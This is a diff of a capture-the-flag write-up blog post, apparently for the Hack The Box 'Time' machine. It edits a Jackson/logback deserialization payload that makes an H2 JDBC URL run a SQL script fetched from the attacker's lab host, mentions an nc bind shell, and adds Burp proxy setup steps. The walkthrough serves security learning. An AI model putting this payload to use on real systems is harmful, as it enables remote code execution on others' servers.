@@ -180,9 +180,23 @@ We can also get a bind shell by replacing the command with 'nc -nlvp 4444' and t
 I still don't understand everything, but it looks like we have to use a part of the command *jruby test.rb "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"* and validate it in the online tool. The PoC was made entirely locally, so we have to change the address where the script *inject.sql* is taken from. This latter becomes *http://10.10.14.8:8000/inject.sql* and we will start with the following query:
 
 ```
-"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]"
+"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8:8000/inject.sql'"}]"
 ```
-Note that I removed all the backslashes in the query since they were probably there to escape some characters for the ruby script. I get a "Validation successful!" message when I validate it on the online tool, but nothing happens. Let's open Burp to intercept the request and response.
+Note that I removed all the backslashes in the query since they were probably there to escape some characters for the ruby script. I get a "Validation successful!" message when I validate it on the online tool, but nothing happens. Let's use Burp to intercept the request and response. Before sending a request, we check our browser's settings by going to Menu -> Preferences, and we type "Proxy" in the search bar. Then we click on Settings and select Manual proxy configuration. We enter 127.0.0.1 for HTTP Proxy, and set Port to 8080. Finally, we tick "Use this proxy server for all protocols" and we click OK. We can now open Burp.\\
+
+In the tool, we paste the previous command in the text field and click on PROCESS:
+
+<div class="img_container">
+![test request]({{https://jsom1.github.io/}}/_images/htb_time_tst.png)
+</div>
+
+And we analyze the request on Burp:
+
+<div class="img_container">
+![Burp]({{https://jsom1.github.io/}}/_images/htb_time_burp.png)
+</div>
+
+Here we see the request and the parameters. We can modify anything we want before forwarding it to the server. Once we're happy with it, we click on forward. We can also analyze the response by right clicking in the Window, selecting Do intercept -> response to this request.
 
 <ins>**My thoughts**</ins>
 
